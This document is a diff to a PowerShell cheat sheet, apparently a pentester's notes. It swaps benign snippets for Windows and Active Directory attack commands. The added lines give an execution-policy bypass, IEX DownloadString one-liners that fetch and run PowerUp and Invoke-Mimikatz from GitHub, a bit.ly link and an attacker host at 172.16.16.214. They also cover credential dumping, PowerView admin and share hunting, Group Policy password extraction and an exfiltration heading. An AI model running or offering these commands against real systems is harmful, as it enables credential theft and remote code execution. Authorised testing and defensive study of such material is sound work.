@@ -1,84 +1,91 @@
 PowerShell
 
 
-Write-Host 'Hello World!'
-
-Get-Command                   Show all commands.
-Get-Content
-Get-Eventlog system
-Get-Process                   Show current running processes.
-Set-Content
+PS C:\> powershell.exe -exec bypass     Start PowerShell and turn off the execution policy.
+PS C:\> mode 300                        Full screen.
+PS C:\> Get-Command                     Show all commands.
+PS C:\> Get- <tab>                      Tab through each command.
+PS C:\> Get-History                     Show Command history.
+PS C:\> Get-Process                     Show current running processes.
 ------------------------------------------------------------------------------------------------------
 
-# Pop-up window
+# Priv escalation
 
-[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
-[System.Windows.Forms.MessageBox]::Show("<message>" , "<Windows title" , <# - button options>)
+- Load from disk
+PS C:\> Import-Module PowerUp.ps1
+PS C:\> Invoke-AllChecks
 
-Example:
-[System.Windows.Forms.MessageBox]::Show("Hello World!" , "Important Message" , 1)
+- Load from GitHub
+PS C:\> "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk');Invoke-PowerUp"
+PS C:\> Invoke-AllChecks
 
-Button options:
-0  OK
-1  OK, Cancel
-2  Abort, Retry, Ignore
-3  Yes, No, Cancel
-4  Yes, No
-5  Retry, Cancel
+- Load from Kali
+cd /opt/Empire/data/module_source/privesc/
+python -m SimpleHTTPServer
+
+- Windows
+PS C:\> "IEX (New-Object Net.WebClient).DownloadString('http://172.16.16.214:8000/PowerUp.ps1');Invoke-PowerUp"
+PS C:\> Invoke-AllChecks
+------------------------------------------------------------
+
+# Dump creds
+
+- Load from GitHub
+PS C:\> "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
+
+- Load from Kali
+cd /opt/Empire/data/module_source/credentials/
+python -m SimpleHTTPServer
+
+- Windows
+PS C:\> "IEX (New-Object Net.WebClient).DownloadString('http://172.16.16.214:8000/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
 ------------------------------------------------------------------------------------------------------
 
-# Speak
+# Open fileshares
 
-(New-Object -ComObject SAPI.SPVoice).Speak(“Hello World!”)
+PS C:\> Import-Module powerview.ps1
+PS C:\> Invoke-ShareFinder -CheckShareAccess
+
+PS C:\> New-PSDrive S -PSProvider FileSystem -Root \\10.0.0.14\SYSVOL
+PS C:\> PSDrive
+PS C:\> Remove-PSDrive S
 ------------------------------------------------------------------------------------------------------
 
-# Error message
+# Who are your admins
 
-The file Cannot be loaded because the execution of scripts is disabled on this system. Bypass it.
-
-powershell.exe -executionpolicy bypass -file <file>
-
-Use the same command to run a file remotely on a Windows system from an active Meterpreter shell.
+PS C:\> Import-Module powerview.ps1
+PS C:\> Get-NetGroups *admin* | Get-NetGroup -Recurse
 ------------------------------------------------------------------------------------------------------
 
-# PS Attack
+# Where are your admins
 
-Get-GPPPassword
+PS C:\> Import-Module powerview.ps1
+PS C:\> Invoke-UserHunter -ShowAll
+------------------------------------------------------------------------------------------------------
 
-get-attack “active directory”
-get-help Get-NetUser
-Get-NetUser -UserName <user>
+# Old user passwords
 
-get-attack groups
-get-help Get-NetLocalGroup
-Get-NetLocalGroup -GroupName “Administrators”
----------------------------------------------------------
+PS C:\> Import-Module powerview.ps1
+PS C:\> Get-NetUser | ? {$_.whenchanged -lt (Get-Date).AddMonths(-12)} | % {$_.samaccountname}
+------------------------------------------------------------------------------------------------------
 
-Restart PS Attack and run as a local user Administrator.
+# Who can admin your DC?
 
-get-attack “local admin”
-Find-LocalAdminAccess
+PS C:\> Import-Module powerview.ps1
+PS C:\> Get-NetDomainControllers | Get-NetLocalGroup
+------------------------------------------------------------------------------------------------------
 
-get-attack find
-get-help Invoke-UserHunter
-Invoke-UserHunter -Examples
-Invoke-UserHunter -CheckAccess
+# Extract passwords from Group Policy
 
-Get-Attack mimi
-get-help Invoke-Mimikatz
-Invoke-Mimikatz -ComputerName <target> -DumpCreds
----------------------------------------------------------
+PS C:\> Import-Module PowerSploit.ps1
+PS C:\> Get-GPPPassword
 
-Restart PS Attack and run as a Domain Admin.
+\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
+Search xml files for cpassword.
+PS C:\> GetDecryptedCpassword 'AES 256-bit encrypted password'
+------------------------------------------------------------------------------------------------------
 
-get-attack “domain controller”
-Get-NetDomainController
+# Exfil
 
-get-attack copy
-get-help Invoke-NinjaCopy -Examples
-Invoke-NinjaCopy -Path “C:\windows\ntds\ntds.dit” -ComputerName <target> -LocalDestination “C:\ntds.dit”
-(takes a little while)
-ls
----------------------------------------------------------
+Egress-Assess
 
-PS Attack build tool
